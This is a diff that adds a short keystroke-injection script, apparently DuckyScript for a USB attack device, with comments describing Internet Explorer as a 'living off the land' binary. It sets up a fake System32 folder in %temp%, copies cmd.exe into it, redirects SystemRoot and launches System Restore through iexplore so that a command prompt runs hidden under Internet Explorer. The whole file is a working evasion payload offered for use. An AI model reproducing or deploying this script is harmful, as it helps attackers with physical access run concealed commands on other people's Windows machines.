@@ -1,0 +1,22 @@
+# use internet explorer as lolbin (living off the land (binary))
+# doing "start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}" opens sysrestore
+# systemrestore uses %SYSTEMROOT% and uses user variables; editing it makes it run another executable
+# if the executable turns out to be cmd.exe or a command prompt, it'll hide all commands under internet explorer
+# https://www.youtube.com/watch?v=PuNgf29Gn8o
+
+STRINGLN cd %temp%
+DELAY 0.1
+STRINGLN mkdir System32
+DELAY 0.1
+
+# this is where the rstui.exe comes in
+# our payload will be cmd
+
+STRINGLN cd System32
+DELAY 0.1
+STRINGLN copy %SystemRoot%/System32/cmd.exe cmd.exe
+DELAY 0.1
+STRINGLN set SystemRoot=%temp%
+DELAY 0.1
+STRINGLN start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
+PRINT done
